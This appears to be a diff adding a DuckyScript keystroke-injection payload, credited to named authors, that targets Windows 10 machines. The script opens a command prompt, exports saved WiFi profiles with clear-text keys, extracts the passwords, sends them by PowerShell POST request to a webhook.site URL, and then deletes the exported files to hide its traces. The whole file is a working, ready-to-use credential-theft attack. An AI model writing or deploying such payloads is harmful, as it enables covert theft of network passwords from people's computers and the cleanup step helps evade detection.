@@ -1,0 +1,28 @@
+REM This is a duckyscript to grab WiFi passwords from Windows machine and submit to webserver via POST request.
+REM Tested on Windows 10 Professional (without UAC enabled and a user with local administrator rights).
+REM Script crafted by @Nullsession0x. Credit to @hum4nG0D for the idea.
+REM Remember to replace the URL parameter with your own unique parameter from https://webhook.site/.
+DELAY 3000
+GUI r
+DELAY 100
+STRING cmd /k
+ENTER
+DELAY 500
+STRING cd %temp%
+ENTER
+DELAY 500
+STRING netsh wlan export profile key=clear
+ENTER
+DELAY 1000
+ENTER
+STRING powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > WiFi-PASS
+ENTER
+DELAY 1000
+STRING powershell Invoke-WebRequest -Uri https://webhook.site/URL -Method POST -InFile WiFi-PASS
+ENTER
+DELAY 1000
+STRING del WiFi* /s /f /q
+ENTER
+DELAY 100
+STRING exit
+ENTER
